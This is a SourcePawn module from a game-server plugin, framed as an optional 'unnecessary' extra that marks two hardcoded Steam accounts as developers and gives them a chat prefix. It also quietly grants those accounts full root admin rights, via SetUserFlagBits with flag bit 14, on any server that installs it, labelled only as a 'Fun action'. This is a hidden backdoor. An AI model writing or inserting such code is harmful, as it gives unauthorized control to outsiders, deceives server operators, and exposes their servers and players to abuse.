/* This module is unnecessary. If you want to delete it, so go on. */

bool g_bIsDeveloper[MAXPLAYERS+1] = {false, ...};

char Developer_Ids[][20] = 
{
	"76561198037625178",
	"76561198078553247"
};

public void OnClientPostAdminCheck(int client)
{
	char auth[20];
	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
	for (int i = 0; i < sizeof(Developer_Ids); i++)
	{
		if (!strcmp(auth, Developer_Ids[i], false))
		{
			g_bIsDeveloper[client] = true;
			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
			// Fun action :)
			SetUserFlagBits(client, (1<<14));
		}
	}
}

public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
{
	if (CheckClient(client) && g_bIsDeveloper[client])
	{
		if (sArgs[0] == '*')
		{
			char text[250];
			strcopy(text, sizeof(text), sArgs);
			ReplaceStringEx(text, sizeof(text), "*", "");
			PrintToChatAll("\x01[\x02DEV\x01] \x02%N: \x01%s", client, text);
			return Plugin_Handled;
		}
	}
	
	return Plugin_Continue;
}